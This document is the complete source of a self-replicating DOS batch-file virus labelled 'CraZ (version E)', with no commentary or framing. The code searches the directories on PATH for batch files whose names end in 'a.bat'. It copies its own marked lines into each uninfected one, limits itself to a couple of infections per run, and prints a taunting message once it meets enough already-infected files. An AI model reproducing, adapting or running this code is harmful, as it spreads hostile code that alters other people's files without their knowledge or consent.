@goto craz
:hst_bat
:: host batch goes here
@goto CraZend
:CraZ (version E)
@echo off%_CraZ%
if '%1=='#ViR goto CraZ%2
if not '%CraZ%==' goto hst_bat
if '%0==' goto hst_bat CraZ
set CraZ=%0
set CraZc=%1 %2 %3 %4 %5 %6 %7 %8 %9
call %0 #ViR hst CraZ
set CraZs=
set CraZi=
set CraZc=%CraZ%
if exist %CraZ%.bat set CraZc=%CraZ%.bat
command /e:5000 /c %CraZ% #ViR vir %path%
set CraZ=
set CraZc=
goto CraZend
:CraZhst
%0 #ViR hs1 %0 %CraZc%
:CraZhs1
shift %_CraZ%
shift %_CraZ%
shift %_CraZ%
goto hst_bat CraZ
:CraZvir
if exist %CraZc% %CraZ% #ViR ser .. . %path%
shift %_CraZ%
if '%2==' exit CraZ
set CraZc=%2\%CraZ%.bat
if not exist %CraZc% set CraZc=%2\%CraZ%
if not exist %CraZc% set CraZc=%2%CraZ%.bat
if not exist %CraZc% set CraZc=%2%CraZ%
goto CraZvir
:CraZser
shift %_CraZ%
if '%2==' exit CraZ
for %%i in (%2\*a.bat %2*a.bat) do call %CraZ% #ViR inf %%i
goto CraZser
:CraZact
echo [CraZ] has determined this computer to be good food.
exit CraZ
:CraZinf
find "CraZ"<%3>nul
if not errorlevel 1 goto CraZS
echo @goto craz>CraZ
echo :hst_bat>>CraZ
type %3>>CraZ
echo.>>CraZ
find "CraZ"<%CraZc%>>CraZ
move CraZ %3>nul
set CraZi=%CraZi%1
if %CraZi%==11 exit
:CraZS
set CraZs=%CraZs%1
if %CraZs%==1111111111 goto CraZact
:CraZend